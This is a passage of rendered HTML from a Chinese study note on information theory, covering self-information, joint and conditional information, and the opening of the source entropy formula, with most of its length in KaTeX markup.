class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><h2 id="信息量">信息量</h2><p>在有了概率分布的基础之后，就可以开始学习基于统计的<strong>自信息量</strong>的概念了。<strong>一定记住公式</strong>，单位是 bit</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mo>−</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">I\left( a_i \right) =-\log _2p\left( a_i \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>需要注意的性质，自信息量的范围是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mo>+</mo><mi mathvariant="normal">∞</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(0,+\infty)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">+</span><span class="mord">∞</span><span class="mclose">)</span></span></span></span>，而且是单减函数。</p><p>对于联合变量，有<strong>联合自信息量</strong>，计算公式也是类似的：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mo>−</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">I\left( a_ib_i \right) =-\log _2p\left( a_ib_i \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>特别的，当互相独立时，就可以拆开：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>+</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>b</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(a_ib_i)=I(a_i)+I(b_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p><strong>条件信息量</strong>则除了计算公式，还和自信息量、联合信息量有直接关系。简单说，就是 <strong>a 的信息量+a 已经发生后 b 发生的信息量，就是 a 和 b 同时发生的信息量</strong>：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo>+</mo><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mi mathvariant="normal">/</mi><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mo>=</mo><mo>−</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>=</mo><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow><mo>+</mo><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">/</mi><msub><mi>b</mi><mi>j</mi></msub><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{aligned}I\left( a_ib_j \right) &amp;=-\log p\left( a_ib_j \right)\\&amp;=-\log p\left( a_i \right) p\left( b_j/a_i \right) =I\left( a_i \right) +I\left( b_j/a_i \right)\\&amp;=-\log p\left( b_j \right) p\left( a_i/b_j \right) =I\left( b_j \right) +I\left( a_i/b_j \right)\\\end{aligned}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.5em;vertical-align:-2em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.5em;"><span style="top:-4.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.16em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-1.66em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>以上，讨论了单个符号的信息量和联合信息量的定义，一个单符号离散信源会有多个符号，就提出了衡量信源信息量的<strong>信源熵</strong>，简单地说，就是每个符号的信息量的平均值，或者信源的平均不确定度、随机性，单位是 bit/sign：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mrow><mo fence="true">[</mo><mi>I</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">]</mo></mrow><mo>=</mo><mi>E</mi><mrow><mo fence="true">[</mo><mo>−</mo><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><mo fence="true">]</mo></mrow><mo>=</mo><mo>−</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow><msub><mrow><mi>log</mi><mo>⁡</mo></mrow><mn>2</mn></msub><mi>p</mi><mrow><mo fence="true">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">H(X)=E\left[ I\left( a_i \right) \right] =E\left[ -\log _2p\left( a_i \right) \right] =-\sum_{i=1}^n{p}\left( a_i \right) \log _2p\left( a_i \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">]</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" 